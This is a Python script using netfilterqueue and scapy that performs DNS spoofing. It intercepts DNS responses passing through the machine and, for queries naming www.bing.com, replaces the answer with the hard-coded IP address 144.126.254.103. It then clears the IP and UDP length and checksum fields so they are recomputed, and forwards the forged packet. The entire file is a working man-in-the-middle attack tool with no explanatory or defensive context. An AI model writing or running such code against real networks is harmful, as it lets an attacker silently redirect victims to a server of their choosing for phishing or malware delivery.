import netfilterqueue
import scapy.all as scapy 

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if b"www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="144.126.254.103")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            print(scapy_packet.show())
            print("Creating new Packet...")
            if scapy_packet.haslayer(scapy.IP):
                print("Changing IP Length and Checksum")
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
            if scapy_packet.haslayer(scapy.UDP):
                print("Changing UDP Length and Checksum")
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

        packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
            
